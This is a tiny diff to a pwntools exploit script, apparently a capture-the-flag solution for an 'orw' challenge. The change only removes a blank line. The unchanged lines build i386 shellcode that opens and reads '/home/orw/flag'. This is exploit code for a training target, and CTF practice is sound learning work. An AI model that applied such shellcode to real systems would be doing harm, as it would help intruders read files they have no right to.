@@ -1,6 +1,5 @@
 from pwn import *
 
-
 shellcode = shellcraft.i386.pushstr("/home/orw/flag")
 shellcode += shellcraft.i386.linux.open(file='esp', oflag=0, mode='O_RDONLY')
 shellcode += shellcraft.i386.linux.read(fd="eax", buf="ebx", nbytes=64)
